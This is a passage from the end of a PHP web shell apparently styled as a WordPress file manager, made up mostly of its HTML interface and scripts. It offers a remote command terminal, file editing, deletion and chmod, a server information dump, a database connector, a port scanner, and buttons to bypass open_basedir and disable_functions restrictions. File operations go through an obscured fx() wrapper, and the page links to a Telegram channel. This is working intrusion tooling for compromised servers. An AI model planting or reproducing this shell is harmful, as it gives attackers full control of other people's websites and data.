                            <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                            <td>
                                <div class="file-actions">
                                    <a href="#" onclick="renameItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Rename</a>
                                    <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($folder); ?>'); return false;">Chmod</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($folder); ?>" class="delete <?php echo $protected ? 'protected' : ''; ?>" onclick="<?php echo $protected ? 'alert(\'Protected!\'); return false;' : 'return confirm(\'Delete this folder?\')'; ?>">Delete</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; endif; ?>
                        
                        <?php if (!empty($files)): ?>
                        <tr class="separator-row"><td colspan="6">📄 Files</td></tr>
                        <?php foreach ($files as $file):
                            $fullPath = $currentPath . $file;
                            $protected = zet_fm_is_protected($fullPath);
                            $size = @fx('x', $fullPath);
                            $perms = zet_fm_get_permissions($fullPath);
                            $writable = @fx('w', $fullPath);
                            $modified = @fx('y', $fullPath);
                            $ext = strtoupper(@fx('D', $file, PATHINFO_EXTENSION) ?: 'FILE');
                            $isZip = (strtolower($ext) === 'ZIP');
                            
                            if ($size !== false) {
                                if ($size < 1024) $size = $size . ' B';
                                elseif ($size < 1048576) $size = round($size/1024, 1) . ' KB';
                                elseif ($size < 1073741824) $size = round($size/1048576, 1) . ' MB';
                                else $size = round($size/1073741824, 1) . ' GB';
                            } else { $size = '?'; }
                            $rowClass = $protected ? 'protected-row' : '';
                        ?>
                        <tr class="<?php echo $rowClass; ?>">
                            <td>
                                <span style="display: inline-flex; align-items: center; gap: 8px;">
                                    <span class="perm-indicator <?php echo $writable ? 'writable' : 'readonly'; ?>"></span>
                                    <span class="file-icon">📄</span>
                                    <span class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo htmlspecialchars($file); ?></span>
                                    <?php if ($protected): ?><span class="protected-badge">🔒 Protected</span><?php endif; ?>
                                </span>
                            </td>
                            <td><?php echo $ext; ?></td>
                            <td><?php echo $size; ?></td>
                            <td class="<?php echo $writable ? 'perm-writable' : 'perm-readonly'; ?>"><?php echo $perms; ?></td>
                            <td><?php echo $modified ? date('Y-m-d H:i', $modified) : '-'; ?></td>
                            <td>
                                <div class="file-actions">
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=edit&item=<?php echo urlencode($file); ?>">Edit</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=download&item=<?php echo urlencode($file); ?>">Download</a>
                                    <?php if ($isZip): ?>
                                    <a href="#" class="unzip" onclick="unzipItem('<?php echo htmlspecialchars($file); ?>'); return false;">Unzip</a>
                                    <?php endif; ?>
                                    <a href="#" onclick="renameItem('<?php echo htmlspecialchars($file); ?>'); return false;">Rename</a>
                                    <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($file); ?>'); return false;">Chmod</a>
                                    <a href="?tab=filemanager&p=<?php echo urlencode($currentPath); ?>&do=delete&item=<?php echo urlencode($file); ?>" class="delete <?php echo $protected ? 'protected' : ''; ?>" onclick="<?php echo $protected ? 'alert(\'Protected!\'); return false;' : 'return confirm(\'Delete this file?\')'; ?>">Delete</a>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; endif; ?>
                        
                        <?php if (empty($folders) && empty($files)): ?>
                        <tr><td colspan="6" class="empty">Empty directory</td></tr>
                        <?php endif; ?>
                    </tbody>
                </table>
                <?php endif; ?>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" id="terminal">
                <div class="terminal-output"><?php echo htmlspecialchars($commandOutput); ?></div>
                <form method="post" class="terminal-input">
                    <input type="text" name="command" placeholder="Enter command..." autocomplete="off">
                    <button type="submit" class="btn">Execute</button>
                </form>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'info' ? 'active' : ''; ?>" id="info">
                <div class="info-grid">
                    <div class="info-card">
                        <h3>🖥️ System Information</h3>
                        <div class="info-item"><span class="info-label">OS</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['os']); ?></span></div>
                        <div class="info-item"><span class="info-label">User</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['user']); ?></span></div>
                        <div class="info-item"><span class="info-label">Server IP</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['ip']); ?></span></div>
                    </div>
                    <div class="info-card">
                        <h3>🐘 PHP Configuration</h3>
                        <div class="info-item"><span class="info-label">PHP Version</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['php']); ?></span></div>
                        <div class="info-item"><span class="info-label">Server Software</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['server']); ?></span></div>
                        <div class="info-item"><span class="info-label">Open Basedir</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['open_basedir']); ?></span></div>
                        <div class="info-item"><span class="info-label">Disabled Functions</span><span class="info-value" style="font-size: 11px;"><?php echo htmlspecialchars($sysInfo['disable_functions']); ?></span></div>
                    </div>
                    <div class="info-card">
                        <h3>💾 Disk Usage</h3>
                        <div class="info-item"><span class="info-label">Total Space</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_total']); ?></span></div>
                        <div class="info-item"><span class="info-label">Free Space</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_free']); ?></span></div>
                        <div class="info-item"><span class="info-label">Usage</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['disk_percent']); ?></span></div>
                        <div class="progress-bar"><div class="progress-fill" style="width: <?php echo htmlspecialchars($sysInfo['disk_percent']); ?>"></div></div>
                    </div>
                    <div class="info-card">
                        <h3>🔌 Extensions</h3>
                        <div class="info-item"><span class="info-label">MySQL</span><span class="info-value"><?php echo htmlspecialchars($sysInfo['mysql']); ?></span></div>
                    </div>
                </div>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'database' ? 'active' : ''; ?>" id="database">
                <h3 style="margin-bottom: 20px; color: #0ff;">Database Connection</h3>
                <form method="post">
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Host:</label><input type="text" name="db_host" value="localhost" style="flex: 1;"></div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Username:</label><input type="text" name="db_user" placeholder="root" style="flex: 1;"></div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Password:</label><input type="password" name="db_pass" style="flex: 1;"></div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Database:</label><input type="text" name="db_name" style="flex: 1;"></div>
                    <button type="submit" class="btn btn-success">Connect</button>
                </form>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'network' ? 'active' : ''; ?>" id="network">
                <h3 style="margin-bottom: 20px; color: #0ff;">Port Scanner</h3>
                <form method="post">
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Host:</label><input type="text" name="scan_host" value="127.0.0.1" style="flex: 1;"></div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Port Start:</label><input type="number" name="scan_port_start" value="1" style="flex: 1;"></div>
                    <div class="tool-group" style="width: 100%; margin-bottom: 15px;"><label>Port End:</label><input type="number" name="scan_port_end" value="1000" style="flex: 1;"></div>
                    <button type="submit" class="btn btn-warning">Scan</button>
                </form>
            </div>
            
            <div class="tab-content <?php echo $activeTab === 'bypass' ? 'active' : ''; ?>" id="bypass">
                <h3 style="margin-bottom: 20px; color: #0ff;">Security Bypass</h3>
                <div class="tools">
                    <a href="?tab=bypass&bypass=open_basedir" class="btn btn-warning">Bypass open_basedir</a>
                    <a href="?tab=bypass&bypass=disable_functions" class="btn btn-warning">Bypass disable_functions</a>
                </div>
            </div>
        </div>
        
        <a href="https://t.me/zetgifar" target="_blank" class="telegram-btn">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
            <span>Telegram</span>
        </a>
        
        <!-- Modals -->
        <div id="newFileModal" class="modal"><div class="modal-content"><div class="modal-header">Create New File</div><form method="post"><div class="modal-body"><input type="text" name="newfile" placeholder="Filename" required><textarea name="filecontent" placeholder="Content"></textarea></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button></div></form></div></div>
        <div id="newFolderModal" class="modal"><div class="modal-content"><div class="modal-header">Create New Folder</div><form method="post"><div class="modal-body"><input type="text" name="newfolder" placeholder="Folder name" required></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button></div></form></div></div>
        
        <script>
            function switchTab(tabName) {
                document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
                document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
                document.getElementById(tabName).classList.add('active');
                const tabs = ['filemanager', 'terminal', 'info', 'database', 'network', 'bypass'];
                document.querySelector(`.tab:nth-child(${tabs.indexOf(tabName) + 1})`).classList.add('active');
            }
            function showNewFile() { document.getElementById('newFileModal').classList.add('active'); }
            function showNewFolder() { document.getElementById('newFolderModal').classList.add('active'); }
            function closeModal(id) { document.getElementById(id).classList.remove('active'); }
            
            function renameItem(oldName) {
                var newName = prompt('Enter new name:', oldName);
                if (newName && newName !== oldName) {
                    var f = document.createElement('form'); f.method = 'post';
                    f.innerHTML = '<input type="hidden" name="oldname" value="' + oldName + '"><input type="hidden" name="newname" value="' + newName + '">';
                    document.body.appendChild(f); f.submit();
                }
            }
            function chmodItem(item) {
                var mode = prompt('Enter new permissions:', '755');
                if (mode) {
                    var f = document.createElement('form'); f.method = 'post';
                    f.innerHTML = '<input type="hidden" name="chmod_item" value="' + item + '"><input type="hidden" name="chmod_value" value="' + mode + '">';
                    document.body.appendChild(f); f.submit();
                }
            }
            function unzipItem(item) {
                if (confirm('Unzip this file?')) {
                    var f = document.createElement('form'); f.method = 'post';
                    f.innerHTML = '<input type="hidden" name="unzip_item" value="' + item + '">';
                    document.body.appendChild(f); f.submit();
                }
            }
            setTimeout(function() { document.querySelectorAll('.notification').forEach(function(n) { n.style.opacity = '0'; setTimeout(function() { n.style.display = 'none'; }, 300); }); }, 5000);
            document.addEventListener('keydown', function(e) { if (e.key === 'Escape') document.querySelectorAll('.modal.active').forEach(function(m) { m.classList.remove('active'); }); });
            document.querySelectorAll('.modal').forEach(function(modal) { modal.addEventListener('click', function(e) { if (e.target === modal) modal.classList.remove('active'); }); });
        </script>
    </body>
    </html>
    <?php
}

if (!defined('ABSPATH')) {
    zet_fm_render_page();
    exit;
}